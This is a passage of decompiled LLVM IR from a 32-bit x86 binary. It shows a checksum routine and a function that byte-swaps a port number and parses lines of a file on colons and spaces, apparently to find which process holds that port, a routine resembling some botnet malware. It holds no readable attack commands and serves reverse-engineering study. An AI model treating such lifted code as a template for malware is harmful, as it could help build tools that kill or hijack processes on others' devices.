  %v0_804d59e = phi i32 [ %v2_804d595, %dec_label_pc_804d59e.loopexit ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v1_804d59e = urem i32 %v0_804d59e, 65536
  %v1_804d5a2 = xor i32 %v1_804d59e, 65535
  ret i32 %v1_804d5a2

dec_label_pc_804d5ac:                             ; preds = %dec_label_pc_804d545
  %v1_804d5ae = inttoptr i32 %v0_804d5ae to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v2_804d5b0 = add i32 %v3_804d5ae, %v0_804d5b0
  br label %dec_label_pc_804d548

; uselistorder directives
  uselistorder i32 %v2_804d595, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d586, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d540, { 1, 0 }
  uselistorder i32 %v1_804d533, { 0, 2, 1 }
  uselistorder i32 %v3_804d521, { 1, 0 }
  uselistorder i32 %v4_804d515, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d590, { 1, 0 }
  uselistorder label %dec_label_pc_804d548, { 1, 0 }
  uselistorder label %dec_label_pc_804d530, { 1, 0 }
}

define i32 @function_804d5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5e0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d5e0 = load i32, i32* @ebp, align 4
  %v0_804d5e1 = load i32, i32* @edi, align 4
  %v0_804d5e2 = load i32, i32* @esi, align 4
  %v0_804d5e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5e3, i32* %stack_var_-16, align 4
  %v15_804d5e4 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d5ea = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d5ea, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804d62d = call i32 @function_805276a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d635 = trunc i32 %arg1 to i16
  %v2_804d635 = call i16 @llvm.bswap.i16(i16 %v1_804d635)
  %v3_804d635 = zext i16 %v2_804d635 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  store i32 %v3_804d635, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804d64b = call i32 @function_805276a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804d64b, i32* %eax.global-to-local, align 4
  %v2_804d65a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d65a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804d662 = call i32 @function_805276a(i8* %tmp72, i32 0, i32 4096)
  %v2_804d66a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d66a, i32* %eax.global-to-local, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v5_804d674 = inttoptr i32 %v0_804d674 to i8*
  store i8* %v5_804d674, i8** %stack_var_-8796, align 4
  %v4_804d675 = sext i32 %v0_804d674 to i64
  %v5_804d675 = call i32 @function_8052050(i64 %v4_804d675, i32 16, i32 %v2_804d66a)
  store i32 %v5_804d675, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804d683 = call i32 @function_8051c40(i8* nonnull %stack_var_-48)
  store i32 %v3_804d683, i32* %eax.global-to-local, align 4
  %v9_804d68b = icmp eq i32 %v3_804d683, 2
  br i1 %v9_804d68b, label %dec_label_pc_804dbb5, label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d5e0, %dec_label_pc_804dbb5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d69b = call i32 @function_80512f0(i8 6)
  store i32 %v3_804d69b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6a7 = call i32 @function_80512f0(i8 7)
  store i32 %v3_804d6a7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6b3 = call i32 @function_80512f0(i8 9)
  %v2_804d6b8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d6b8 = ptrtoint i8* %v2_804d6b8 to i32
  store i32 %v3_804d6b8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b30.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804d6c1 = call i32 @function_80522f2(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b30.20, i32 0, i32 0), i32 0)
  store i32 %v4_804d6c1, i32* @eax, align 4
  store i32 %v4_804d6c1, i32* @ebp, align 4
  %v10_804d6cb = icmp eq i32 %v4_804d6c1, -1
  br i1 %v10_804d6cb, label %dec_label_pc_804db4e, label %dec_label_pc_804d6d4.outer.preheader

dec_label_pc_804d6d4.outer.preheader:             ; preds = %dec_label_pc_804d694
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc9095 = call i32 @function_8051e60(i32 %v2_804d5ea, i32 512, i32 %v4_804d6c1)
  store i32 %v4_804d6dc9095, i32* %eax.global-to-local, align 4
  %v1_804d6e49196 = icmp eq i32 %v4_804d6dc9095, 0
  br i1 %v1_804d6e49196, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph.lr.ph

dec_label_pc_804d6ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d6d4.outer.preheader
  %v2_804d718 = add i32 %v15_804d5e4, 8221
  %v2_804d744 = add i32 %v15_804d5e4, 8219
  br label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec:                             ; preds = %dec_label_pc_804d6ec.lr.ph, %dec_label_pc_804d6d4.backedge
  %v4_804d6dc92 = phi i32 [ %v4_804d6dc9098, %dec_label_pc_804d6ec.lr.ph ], [ %v4_804d6dc, %dec_label_pc_804d6d4.backedge ]
  %v3_804d6ec = load i8, i8* %stack_var_-561, align 1
  %v4_804d6ec = sext i8 %v3_804d6ec to i32
  %v7_804d6ec = and i32 %v4_804d6dc92, -256
  %v8_804d6ec = or i32 %v4_804d6ec, %v7_804d6ec
  store i32 %v8_804d6ec, i32* @eax, align 4
  %v4_804d6f3 = icmp eq i8 %v3_804d6ec, 0
  br i1 %v4_804d6f3, label %dec_label_pc_804db17, label %dec_label_pc_804d6fb

dec_label_pc_804d6fb:                             ; preds = %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804d6fd = icmp eq i8 %v3_804d6ec, 58
  br i1 %v10_804d6fd, label %dec_label_pc_804db17, label %dec_label_pc_804d705.preheader

dec_label_pc_804d705.preheader:                   ; preds = %dec_label_pc_804d6fb
  %v1_804d706.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d705.preheader, %dec_label_pc_804d70d
  %v6_804d706 = phi i32 [ %v8_804d6ec, %dec_label_pc_804d705.preheader ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v0_804d705 = phi i32 [ 0, %dec_label_pc_804d705.preheader ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v1_804d705 = add i32 %v0_804d705, 1
  store i32 %v1_804d705, i32* %edx.global-to-local, align 4
  %v2_804d706 = add i32 %v1_804d705, %v1_804d706.pre
  %v3_804d706 = inttoptr i32 %v2_804d706 to i8*
  %v4_804d706 = load i8, i8* %v3_804d706, align 1
  %v5_804d706 = zext i8 %v4_804d706 to i32
  %v7_804d706 = and i32 %v6_804d706, -256
  %v8_804d706 = or i32 %v5_804d706, %v7_804d706
  store i32 %v8_804d706, i32* @eax, align 4
  %v4_804d709 = icmp eq i8 %v4_804d706, 0
  br i1 %v4_804d709, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d705
  %v10_804d70d = icmp eq i8 %v4_804d706, 58
  %v1_804d70f = icmp eq i1 %v10_804d70d, false
  br i1 %v1_804d70f, label %dec_label_pc_804d705, label %dec_label_pc_804d711

dec_label_pc_804d711:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804db17
  %v1_804d72f = phi i32 [ 0, %dec_label_pc_804db17 ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v7_804d718 = phi i32 [ %v8_804d6ec, %dec_label_pc_804db17 ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v3_804d711 = trunc i32 %v7_804d718 to i8
  %v4_804d711 = icmp eq i8 %v3_804d711, 0
  br i1 %v4_804d711, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d715

dec_label_pc_804d6d4.backedge:                    ; preds = %dec_label_pc_804d705, %dec_label_pc_804d711, %dec_label_pc_804d744
  %v0_804d6d4.be = phi i32 [ %v7_804d718, %dec_label_pc_804d711 ], [ 0, %dec_label_pc_804d744 ], [ %v8_804d706, %dec_label_pc_804d705 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc = call i32 @function_8051e60(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d4.be)
  store i32 %v4_804d6dc, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = icmp eq i32 %v4_804d6dc, 0
  br i1 %v1_804d6e4, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec

dec_label_pc_804d715:                             ; preds = %dec_label_pc_804d711
  %v1_804d715 = add i32 %v1_804d72f, 2
  store i32 %v1_804d715, i32* @ecx, align 4
  %v3_804d718 = add i32 %v2_804d718, %v1_804d72f
  %v4_804d718 = inttoptr i32 %v3_804d718 to i8*
  %v5_804d718 = load i8, i8* %v4_804d718, align 1
  %v6_804d718 = zext i8 %v5_804d718 to i32
  %v8_804d718 = and i32 %v7_804d718, -256
  %v9_804d718 = or i32 %v6_804d718, %v8_804d718
  store i32 %v9_804d718, i32* %eax.global-to-local, align 4
  %v4_804d71f = icmp eq i8 %v5_804d718, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d744, label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d715
  %v7_804d727 = icmp eq i8 %v5_804d718, 32
  br i1 %v7_804d727, label %dec_label_pc_804d744, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d727
  %v0_804d72f = load i32, i32* @edi, align 4
  %v2_804d72f = add i32 %v0_804d72f, %v1_804d72f
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d72f
  %v5_804d732 = phi i32 [ %v7_804d732, %dec_label_pc_804d73a ], [ %v1_804d72f, %dec_label_pc_804d72f ]
  %v0_804d735 = phi i32 [ %v1_804d735, %dec_label_pc_804d73a ], [ %v2_804d72f, %dec_label_pc_804d72f ]
  %v1_804d732 = add i32 %v0_804d735, 3
  %v2_804d732 = inttoptr i32 %v1_804d732 to i8*
  %v3_804d732 = load i8, i8* %v2_804d732, align 1
  %v4_804d732 = zext i8 %v3_804d732 to i32
  %v6_804d732 = and i32 %v5_804d732, -256
  %v7_804d732 = or i32 %v4_804d732, %v6_804d732
  store i32 %v7_804d732, i32* %edx.global-to-local, align 4
  %v1_804d735 = add i32 %v0_804d735, 1
  store i32 %v1_804d735, i32* %eax.global-to-local, align 4
  %v4_804d736 = icmp eq i8 %v3_804d732, 0
  br i1 %v4_804d736, label %dec_label_pc_804d73f, label %dec_label_pc_804d73a

dec_label_pc_804d73a:                             ; preds = %dec_label_pc_804d732
  %v7_804d73a = icmp eq i8 %v3_804d732, 32
  %v1_804d73d = icmp eq i1 %v7_804d73a, false
  br i1 %v1_804d73d, label %dec_label_pc_804d732, label %dec_label_pc_804d73f

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d732
  %v2_804d73f = sub i32 %v1_804d735, %v0_804d72f
  store i32 %v2_804d73f, i32* %eax.global-to-local, align 4
  %v1_804d741 = add i32 %v2_804d73f, 2
  br label %dec_label_pc_804d744

dec_label_pc_804d744:                             ; preds = %dec_label_pc_804d715, %dec_label_pc_804d727, %dec_label_pc_804d73f
  %storemerge = phi i32 [ %v1_804d741, %dec_label_pc_804d73f ], [ %v1_804d715, %dec_label_pc_804d727 ], [ %v1_804d715, %dec_label_pc_804d715 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804d744 = add i32 %v2_804d744, %storemerge
  %v4_804d744 = inttoptr i32 %v3_804d744 to i8*
  store i8 0, i8* %v4_804d744, align 1
  %v0_804d74f = load i32, i32* @edi, align 4
  %v1_804d74f = load i32, i32* @ecx, align 4
  %v2_804d74f = add i32 %v1_804d74f, %v0_804d74f
  store i32 %v2_804d74f, i32* @ebx, align 4
  %v5_804d752 = inttoptr i32 %v2_804d74f to i8*
  store i8* %v5_804d752, i8** %stack_var_-8796, align 4
  %v3_804d753 = call i32 @function_8051c40(i8* %v5_804d752)
  store i32 %v3_804d753, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* @edx, align 4
  %v0_804d764 = load i32, i32* @ebx, align 4
  %v5_804d764 = inttoptr i32 %v0_804d764 to i8*
  store i8* %v5_804d764, i8** %stack_var_-8796, align 4
  %v5_804d765 = call i32 @function_8051f30(i8* %v5_804d764, i32 %v3_804d753, i32 %v2_804d66a)
  %v1_804d76d = add i32 %v5_804d765, 1
  %v8_804d76d = icmp eq i32 %v1_804d76d, 0
  store i32 %v1_804d76d, i32* @eax, align 4
  br i1 %v8_804d76d, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d774

dec_label_pc_804d774:                             ; preds = %dec_label_pc_804d744
  %v0_804d774 = load i32, i32* @esi, align 4
  %v1_804d774 = add i32 %v0_804d774, 1
  %v0_804d777 = load i32, i32* @edi, align 4
  %v2_804d777 = add i32 %v0_804d777, %v0_804d774
  store i32 %v2_804d777, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804d783.outer:                       ; preds = %dec_label_pc_804db02, %dec_label_pc_804d774
  %v0_804daf830 = phi i32 [ %v1_804daf8, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  %v0_804d78625 = phi i32 [ %v1_804d786, %dec_label_pc_804db02 ], [ %v1_804d774, %dec_label_pc_804d774 ]
  %v5_804d78324 = phi i32 [ %v7_804d783, %dec_label_pc_804db02 ], [ %v1_804d76d, %dec_label_pc_804d774 ]
  %v0_804d78322 = phi i32 [ %v1_804db08, %dec_label_pc_804db02 ], [ %v2_804d777, %dec_label_pc_804d774 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  br label %dec_label_pc_804d783

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d783.outer, %dec_label_pc_804d7a5
  %v0_804daf8 = phi i32 [ %v0_804daf830, %dec_label_pc_804d783.outer ], [ %v0_804d7a6, %dec_label_pc_804d7a5 ]
  %v0_804db10 = phi i32 [ 0, %dec_label_pc_804d783.outer ], [ %storemerge4, %dec_label_pc_804d7a5 ]
  %v0_804d786 = phi i32 [ %v0_804d78625, %dec_label_pc_804d783.outer ], [ %v1_804d786, %dec_label_pc_804d7a5 ]
  %v5_804d783 = phi i32 [ %v5_804d78324, %dec_label_pc_804d783.outer ], [ %v7_804d783, %dec_label_pc_804d7a5 ]
  %v0_804d7a5 = phi i32 [ %v0_804d78322, %dec_label_pc_804d783.outer ], [ %v1_804d7a5, %dec_label_pc_804d7a5 ]
  %v1_804d783 = add i32 %v0_804d7a5, 2
  %v2_804d783 = inttoptr i32 %v1_804d783 to i8*
  %v3_804d783 = load i8, i8* %v2_804d783, align 1
  %v4_804d783 = zext i8 %v3_804d783 to i32
  %v6_804d783 = and i32 %v5_804d783, -256
  %v7_804d783 = or i32 %v4_804d783, %v6_804d783
  store i32 %v7_804d783, i32* @eax, align 4
  %v1_804d786 = add i32 %v0_804d786, 1
  %v4_804d787 = icmp eq i8 %v3_804d783, 0
  br i1 %v4_804d787, label %dec_label_pc_804d7ab, label %dec_label_pc_804d78b

dec_label_pc_804d78b:                             ; preds = %dec_label_pc_804d783
  %v7_804d78b = icmp eq i8 %v3_804d783, 32
  br i1 %v7_804d78b, label %dec_label_pc_804db10, label %dec_label_pc_804d793

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d78b
  %v10_804d793 = icmp eq i8 %v3_804d783, 9
  br i1 %v10_804d793, label %dec_label_pc_804db10, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d793
  %v1_804d79b = trunc i32 %v0_804db10 to i8
  %v9_804d79b = icmp eq i8 %v1_804d79b, 1
  br i1 %v9_804d79b, label %dec_label_pc_804daf8, label %dec_label_pc_804d7a3

dec_label_pc_804d7a3:                             ; preds = %dec_label_pc_804daf8, %dec_label_pc_804d79b
  %v0_804d7a631 = phi i32 [ %v1_804daf8, %dec_label_pc_804daf8 ], [ %v0_804daf8, %dec_label_pc_804d79b ]
  br label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804db10, %dec_label_pc_804d7a3
  %v0_804d7a6 = phi i32 [ %v0_804d7a631, %dec_label_pc_804d7a3 ], [ %v0_804daf8, %dec_label_pc_804db10 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804d7a3 ], [ %v2_804db10, %dec_label_pc_804db10 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804d7a5 = add i32 %v0_804d7a5, 1
  store i32 %v1_804d7a5, i32* %edx.global-to-local, align 4
  %v7_804d7a9 = icmp sgt i32 %v0_804d7a6, 6
  br i1 %v7_804d7a9, label %dec_label_pc_804d7ab, label %dec_label_pc_804d783

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d783
  %v5_804d7ca35 = phi i32 [ %storemerge4, %dec_label_pc_804d7a5 ], [ %v0_804db10, %dec_label_pc_804d783 ]
  store i32 %v1_804d786, i32* %edx.global-to-local, align 4
  %v4_804d7ad = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d7ad, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7b8

dec_label_pc_804d6d4.outer.backedge:              ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7d8
  %v0_804d6d48.be = phi i32 [ %v3_804d7e7, %dec_label_pc_804d7d8 ], [ %v7_804d783, %dec_label_pc_804d7ab ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d7d8 ], [ 0, %dec_label_pc_804d7ab ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc90 = call i32 @function_8051e60(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d48.be)
  store i32 %v4_804d6dc90, i32* %eax.global-to-local, align 4
  %v1_804d6e491 = icmp eq i32 %v4_804d6dc90, 0
  br i1 %v1_804d6e491, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec.lr.ph:                       ; preds = %dec_label_pc_804d6ec.lr.ph.lr.ph, %dec_label_pc_804d6d4.outer.backedge
  %v4_804d6dc9098 = phi i32 [ %v4_804d6dc9095, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %v4_804d6dc90, %dec_label_pc_804d6d4.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ]
  br label %dec_label_pc_804d6ec

dec_label_pc_804d7b8:                             ; preds = %dec_label_pc_804d7ab
  %v3_804d7b8 = add i32 %v1_804d786, %v2_804d744
  %v4_804d7b8 = inttoptr i32 %v3_804d7b8 to i8*
  %v5_804d7b8 = load i8, i8* %v4_804d7b8, align 1
  %v6_804d7b8 = zext i8 %v5_804d7b8 to i32
  %v9_804d7b8 = or i32 %v6_804d7b8, %v6_804d783
  store i32 %v9_804d7b8, i32* %eax.global-to-local, align 4
  %v4_804d7bf = icmp eq i8 %v5_804d7b8, 0
  br i1 %v4_804d7bf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804d7b8
  %v7_804d7c3 = icmp eq i8 %v5_804d7b8, 32
  br i1 %v7_804d7c3, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c7

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c3
  %v2_804d7c7 = add i32 %v1_804d786, %v0_804d777
  store i32 %v2_804d7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7ca

dec_label_pc_804d7ca:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7c7
  %v0_804d7cd = phi i32 [ %v1_804d7cd, %dec_label_pc_804d7d3 ], [ %v1_804d786, %dec_label_pc_804d7c7 ]
  %v5_804d7ca = phi i32 [ %v7_804d7ca, %dec_label_pc_804d7d3 ], [ %v5_804d7ca35, %dec_label_pc_804d7c7 ]
  %v0_804d7ce = phi i32 [ %v1_804d7ca, %dec_label_pc_804d7d3 ], [ %v2_804d7c7, %dec_label_pc_804d7c7 ]
  %v1_804d7ca = add i32 %v0_804d7ce, 1
  %v2_804d7ca = inttoptr i32 %v1_804d7ca to i8*
  %v3_804d7ca = load i8, i8* %v2_804d7ca, align 1
  %v1_804d7cd = add i32 %v0_804d7cd, 1
  store i32 %v1_804d7ca, i32* %eax.global-to-local, align 4
  %v4_804d7cf = icmp eq i8 %v3_804d7ca, 0
  br i1 %v4_804d7cf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7ca
  %v4_804d7ca = zext i8 %v3_804d7ca to i32
  %v6_804d7ca = and i32 %v5_804d7ca, -256
  %v7_804d7ca = or i32 %v4_804d7ca, %v6_804d7ca
  %v7_804d7d3 = icmp eq i8 %v3_804d7ca, 32
  %v1_804d7d6 = icmp eq i1 %v7_804d7d3, false
  br i1 %v1_804d7d6, label %dec_label_pc_804d7ca, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7ca, %dec_label_pc_804d7c3, %dec_label_pc_804d7b8
  %v1_804d7d8 = phi i32 [ %v1_804d786, %dec_label_pc_804d7c3 ], [ %v1_804d786, %dec_label_pc_804d7b8 ], [ %v1_804d7cd, %dec_label_pc_804d7ca ], [ %v1_804d7cd, %dec_label_pc_804d7d3 ]
  %v3_804d7d8 = add i32 %v1_804d7d8, %v2_804d744
  %v4_804d7d8 = inttoptr i32 %v3_804d7d8 to i8*
  store i8 0, i8* %v4_804d7d8, align 1
  %v0_804d7e3 = load i32, i32* @edi, align 4
  %v1_804d7e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7e3 = add i32 %v1_804d7e3, %v0_804d7e3
  store i32 %v2_804d7e3, i32* @ebx, align 4
  %v5_804d7e6 = inttoptr i32 %v2_804d7e3 to i8*
  store i8* %v5_804d7e6, i8** %stack_var_-8796, align 4
  %v3_804d7e7 = call i32 @function_8051c40(i8* %v5_804d7e6)
  store i32 %v3_804d7e7, i32* @eax, align 4
  %v1_804d7ef = add i32 %v3_804d7e7, -15
  %v6_804d7ef = sub i32 14, %v3_804d7e7
  %v7_804d7ef = and i32 %v6_804d7ef, %v3_804d7e7
  %v8_804d7ef = icmp slt i32 %v7_804d7ef, 0
  %v9_804d7ef = icmp eq i32 %v1_804d7ef, 0
  %v10_804d7ef = icmp slt i32 %v1_804d7ef, 0
  %v3_804d7f2 = icmp eq i1 %v10_804d7ef, %v8_804d7ef
  %v4_804d7f2 = icmp eq i1 %v9_804d7ef, false
  %v5_804d7f2 = and i1 %v4_804d7f2, %v3_804d7f2
  br i1 %v5_804d7f2, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7d8
  %v0_804d7fa = load i32, i32* @ebx, align 4
  %v2_804d7fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d7fb, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804d803 = call i32 @function_8051c60(i8* %tmp73, i32 %v0_804d7fa)
  store i32 %v4_804d803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b.loopexit:                    ; preds = %dec_label_pc_804d6d4.backedge, %dec_label_pc_804d6d4.outer.preheader, %dec_label_pc_804d6d4.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804d6d4.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804d6d4.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d80b.loopexit, %dec_label_pc_804d7f8
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d80b.loopexit ], [ %tmp73, %dec_label_pc_804d7f8 ]
  %v2_804d815.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d80b.loopexit ], [ %v2_804d7fb, %dec_label_pc_804d7f8 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d80b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d7f8 ]
  %v0_804d80e = load i32, i32* @ebp, align 4
  %v5_804d80e = inttoptr i32 %v0_804d80e to i8*
  store i8* %v5_804d80e, i8** %stack_var_-8796, align 4
  %v2_804d80f = call i32 @function_80521e1(i32 %v0_804d80e)
  %v2_804d814 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d814 = ptrtoint i8* %v2_804d814 to i32
  store i32 %v3_804d814, i32* %eax.global-to-local, align 4
  store i32 %v2_804d815.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804d81d = call i32 @function_8051c40(i8* %.pre-phi)
  store i32 %v3_804d81d, i32* %eax.global-to-local, align 4
  %v1_804d825 = icmp eq i32 %v3_804d81d, 0
  br i1 %v1_804d825, label %dec_label_pc_804db27, label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d80b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804d833 = call i32 @function_8051240(i32 6, i32* null)
  store i32 %v4_804d833, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804d83a = inttoptr i32 %v4_804d833 to i8*
  store i8* %v4_804d83a, i8** %stack_var_-8796, align 4
  %v2_804d83d = call i32 @function_80525a4(i32 %v4_804d833)
  store i32 %v2_804d83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d83d, i32* %stack_var_-8780, align 4
  %v1_804d849 = icmp eq i32 %v2_804d83d, 0
  br i1 %v1_804d849, label %dec_label_pc_804db77, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d918, %dec_label_pc_804d88a, %dec_label_pc_804d87d, %dec_label_pc_804dbee, %dec_label_pc_804d82d
  %v0_804d859 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804dbf7, %dec_label_pc_804dbee ], [ %v1_804d866, %dec_label_pc_804d87d ], [ %v1_804d90e, %dec_label_pc_804d88a ], [ %v1_804d990, %dec_label_pc_804d918 ]
  %v2_804d85c = inttoptr i32 %v0_804d859 to i32*
  %v3_804d85c = load i32, i32* %v2_804d85c, align 4
  store i32 %v3_804d85c, i32* @ebx, align 4
  %v2_804d860 = add i32 %v0_804d859, -16
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v3_804d85c, i32* %v3_804d860, align 4
  %v0_804d861 = call i32 @function_8052695()
  store i32 %v0_804d861, i32* @eax, align 4
  %v0_804d866 = load i32, i32* @esp, align 4
  %v1_804d866 = add i32 %v0_804d866, 16
  %v1_804d869 = icmp eq i32 %v0_804d861, 0
  br i1 %v1_804d869, label %dec_label_pc_804db62, label %dec_label_pc_804d871

